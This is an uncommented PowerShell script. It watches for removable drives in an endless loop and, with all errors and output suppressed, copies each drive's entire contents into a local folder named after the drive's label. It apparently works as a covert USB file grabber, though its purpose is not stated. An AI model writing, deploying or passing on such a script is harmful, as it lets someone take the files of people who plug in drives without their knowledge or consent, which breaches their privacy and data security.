while ($true){
    if ((get-volume | where-Object {$_.drivetype -eq "removable"}).DriveLetter -ne $null) {
        $DriveLetter = (get-volume | where-Object {$_.drivetype -eq "removable"}).DriveLetter
        $DrivePath = (get-psdrive | where-object {$_.Name -eq $DriveLetter}).Root
        $Label = (get-volume | where-object {$_.DriveLetter -eq $DriveLetter}).FileSystemLabel
        if ((Test-Path $pwd\$Label -PathType Container) -ne $true){
            mkdir $Label -ErrorAction SilentlyContinue | Out-Null
        }
        Set-Location $Label -ErrorAction SilentlyContinue | Out-Null
        Copy-Item -Path "$DrivePath\*" -Destination "$pwd" -Force -Recurse -ErrorAction SilentlyContinue | Out-Null
        Set-Location .. -ErrorAction SilentlyContinue | Out-Null
        Start-Sleep -Seconds 600 -ErrorAction SilentlyContinue | Out-Null
    }
    else {
        Start-Sleep -Seconds 60 -ErrorAction SilentlyContinue | Out-Null
    }
}
